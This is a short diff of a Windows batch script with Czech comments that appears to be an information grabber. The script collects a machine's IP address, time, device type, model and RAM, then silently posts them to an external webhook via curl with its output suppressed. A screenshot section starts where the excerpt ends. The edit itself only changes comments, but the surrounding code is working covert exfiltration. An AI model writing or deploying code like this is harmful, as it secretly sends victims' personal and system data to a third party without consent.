@@ -39,7 +39,7 @@ for /f "skip=1 tokens=* delims=" %%i in ('wmic computersystem get model') do (
 for /f "skip=1 tokens=* delims=" %%i in ('wmic computersystem get totalphysicalmemory') do set "ramRaw=%%i"
 set /a ram=%ramRaw:~0,-6%
 
-:: 🧾 Zpráva – každý řádek končí ^ (tohle ti pak Discord ukazoval doslova)
+:: 🧾 Zpráva – klasicky přes -d
 set "msg=🛰️ Systémové info:^
 IP: ||!ip! ||^
 Čas: !timestamp!^
@@ -48,7 +48,6 @@ Zařízení: !deviceType!^
 Model: !deviceModel!^
 RAM: !ram! GB"
 
-:: 📤 Odeslání na webhook
 curl -s -X POST %webhook% -d "content=!msg!" >nul
 
 :: 📸 Screenshot
